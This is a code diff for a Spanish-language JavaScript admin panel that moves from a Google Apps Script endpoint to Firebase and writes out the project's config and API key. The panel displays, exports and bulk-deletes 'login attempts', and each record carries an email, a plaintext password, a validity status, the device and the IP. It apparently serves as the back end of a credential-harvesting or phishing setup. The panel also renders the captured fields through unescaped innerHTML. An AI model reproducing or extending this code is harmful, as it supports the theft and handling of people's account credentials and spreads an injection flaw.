@@ -1,5 +1,22 @@
-// Configuración - MISMA URL
-const API_URL = 'https://script.google.com/macros/s/AKfycbwsPj9OX59TC_rzS34hWt2N2cVrBSHJ7cl02cJ0fg1H0yVzxp5JcmL8rYmfmMMQpdISPw/exec';
+// 🔥 CONFIGURACIÓN FIREBASE - MISMA CONFIGURACIÓN
+const firebaseConfig = {
+  apiKey: "AIzaSyBcdFsHGjJ1FCok9lw9q-zG-I9C91L7KsU",
+  authDomain: "mi-login-app-dd899.firebaseapp.com",
+  projectId: "mi-login-app-dd899",
+  storageBucket: "mi-login-app-dd899.firebasestorage.app",
+  messagingSenderId: "462347115903",
+  appId: "1:462347115903:web:23bed26b7fc2dbd57b4e4a"
+};
+
+// Inicializar Firebase
+try {
+    firebase.initializeApp(firebaseConfig);
+    console.log('✅ Firebase inicializado correctamente');
+} catch (error) {
+    console.error('❌ Error inicializando Firebase:', error);
+}
+
+const db = firebase.firestore();
 
 document.addEventListener('DOMContentLoaded', function() {
     const dataContent = document.getElementById('dataContent');
@@ -18,9 +35,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // Botón limpiar
     clearBtn.addEventListener('click', function() {
-        if (confirm('¿Estás seguro de que quieres limpiar la vista local?')) {
-            dataContent.innerHTML = '<p class="no-data">No hay datos guardados aún</p>';
-            updateStats([]);
+        if (confirm('¿Estás seguro de que quieres eliminar TODOS los datos de Firebase?')) {
+            clearFirebaseData();
         }
     });
 
@@ -29,29 +45,53 @@ document.addEventListener('DOMContentLoaded', function() {
 
     async function loadData() {
         try {
-            console.log('🔄 Cargando datos desde Google Sheets...');
-            const response = await fetch(API_URL);
-            const result = await response.json();
+            console.log('🔄 Cargando datos desde Firebase...');
             
-            console.log('📊 Datos recibidos:', result);
+            const snapshot = await db.collection('loginAttempts')
+                .orderBy('timestamp', 'desc')
+                .limit(100)
+                .get();
             
-            if (result.success) {
-                updateStats(result.data);
-                updateDataContent(result.data);
-            } else {
-                alert('Error cargando datos: ' + result.error);
-            }
+            const loginAttempts = [];
+            snapshot.forEach(doc => {
+                loginAttempts.push(doc.data());
+            });
+            
+            console.log('📊 Datos recibidos:', loginAttempts.length, 'registros');
+            
+            updateStats(loginAttempts);
+            updateDataContent(loginAttempts);
+            
         } catch (error) {
             console.error('❌ Error cargando datos:', error);
             alert('Error de conexión: ' + error.message);
         }
     }
 
+    async function clearFirebaseData() {
+        try {
+            const snapshot = await db.collection('loginAttempts').get();
+            const batch = db.batch();
+            
+            snapshot.forEach(doc => {
+                batch.delete(doc.ref);
+            });
+            
+            await batch.commit();
+            alert('🗑️ Todos los datos han sido eliminados de Firebase');
+            loadData();
+            
+        } catch (error) {
+            console.error('Error eliminando datos:', error);
+            alert('Error eliminando datos: ' + error.message);
+        }
+    }
+
     function updateStats(attempts) {
         totalAttempts.textContent = attempts.length;
         
-        const success = attempts.filter(attempt => attempt.Status && attempt.Status.includes('CORRECTO')).length;
-        const failed = attempts.filter(attempt => attempt.Status && attempt.Status.includes('INCORRECTO')).length;
+        const success = attempts.filter(attempt => attempt.status && attempt.status.includes('CORRECTO')).length;
+        const failed = attempts.filter(attempt => attempt.status && attempt.status.includes('INCORRECTO')).length;
         
         successAttempts.textContent = success;
         failedAttempts.textContent = failed;
@@ -65,17 +105,20 @@ document.addEventListener('DOMContentLoaded', function() {
 
         let html = '';
         loginAttempts.forEach((attempt, index) => {
-            const statusClass = attempt.Status && attempt.Status.includes('CORRECTO') ? 'status-correct' : 'status-incorrect';
+            const statusClass = attempt.status && attempt.status.includes('CORRECTO') ? 'status-correct' : 'status-incorrect';
+            const timestamp = new Date(attempt.timestamp).toLocaleString();
+            
             html += `
                 <div class="user-data">
                     <div class="user-header">
-                        <span class="user-email">📧 ${attempt.Email || 'N/A'}</span>
-                        <span class="status ${statusClass}">${attempt.Status || '❌ INCORRECTO'}</span>
+                        <span class="user-email">📧 ${attempt.email || 'N/A'}</span>
+                        <span class="status ${statusClass}">${attempt.status || '❌ INCORRECTO'}</span>
                     </div>
-                    <div class="user-password">🔑 ${attempt.Password || 'N/A'}</div>
+                    <div class="user-password">🔑 ${attempt.password || 'N/A'}</div>
                     <div class="user-meta">
-                        ⏰ ${attempt.Timestamp || 'N/A'} 
-                        ${attempt.UserAgent ? `<br>🖥️ ${attempt.UserAgent.substring(0, 50)}...` : ''}
+                        ⏰ ${timestamp} 
+                        ${attempt.device ? `<br>${attempt.device}` : ''}
+                        ${attempt.ip ? `<br>🌐 IP: ${attempt.ip}` : ''}
                     </div>
                 </div>
             `;
@@ -85,14 +128,21 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     function exportData() {
+        const allData = Array.from(document.querySelectorAll('.user-data')).map(item => ({
+            email: item.querySelector('.user-email').textContent.replace('📧 ', ''),
+            password: item.querySelector('.user-password').textContent.replace('🔑 ', ''),
+            status: item.querySelector('.status').textContent,
+            timestamp: item.querySelector('.user-meta').textContent.split('⏰ ')[1]?.split('<br>')[0],
+            device: item.querySelector('.user-meta').innerHTML.includes('device') ? 
+                    item.querySelector('.user-meta').innerHTML.split('<br>')[1] : '',
+            ip: item.querySelector('.user-meta').innerHTML.includes('IP:') ? 
+                 item.querySelector('.user-meta').innerHTML.split('IP: ')[1] : ''
+        }));
+
         const dataToExport = {
             exportDate: new Date().toISOString(),
-            data: Array.from(document.querySelectorAll('.user-data')).map(item => ({
-                email: item.querySelector('.user-email').textContent.replace('📧 ', ''),
-                password: item.querySelector('.user-password').textContent.replace('🔑 ', ''),
-                status: item.querySelector('.status').textContent,
-                timestamp: item.querySelector('.user-meta').textContent.split('⏰ ')[1]?.split(' ')[0]
-            }))
+            totalRecords: allData.length,
+            loginAttempts: allData
         };
 
         const blob = new Blob([JSON.stringify(dataToExport, null, 2)], { type: 'application/json' });
@@ -104,5 +154,7 @@ document.addEventListener('DOMContentLoaded', function() {
         a.click();
         document.body.removeChild(a);
         URL.revokeObjectURL(url);
+        
+        alert(`✅ Datos exportados correctamente (${allData.length} registros)`);
     }
 });
